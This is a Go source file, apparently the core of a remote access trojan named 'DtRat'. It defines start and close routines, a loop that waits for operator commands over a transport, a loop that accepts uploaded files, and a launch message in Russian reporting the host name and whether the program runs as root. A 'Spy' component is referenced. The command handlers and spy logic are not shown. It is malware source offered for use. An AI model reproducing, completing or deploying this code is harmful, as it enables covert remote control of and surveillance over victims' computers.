package rat

func (r *Rat) internalClose(reason error) {
	if !r.isRunning.Swap(false) {
		return
	}

	r.Engine.Close()
	r.Spy.Close()

	r.Transport.Close()

	r.CloseCh <- reason
}

func (r *Rat) Close() {
	r.internalClose(nil)
}

func (r *Rat) Start() {
	if r.isRunning.Swap(true) {
		return
	}

	r.Transport.Start()
	go r.commandHandling()
	go r.fileHandling()
	r.Transport.Send("DtRat Запущен!\n\nХост: %s\nroot: %t", r.Config.General.AgentName, r.Engine.Info.IsRoot())
}

func (r *Rat) commandHandling() {
	for true {
		if !r.isRunning.Load() {
			return
		}

		msg, err := r.Transport.Wait()
		if err != nil {
			continue
		}

		r.commandsSwitch(msg)
	}
}

func (r *Rat) fileHandling() {
	for true {
		if !r.isRunning.Load() {
			return
		}

		path, err := r.Transport.WaitFile()
		if err != nil {
			r.Transport.Send("Ошибка при получении файла: %v", err)
			continue
		}

		r.Transport.Send("Файл получен: %s", path)
	}
}
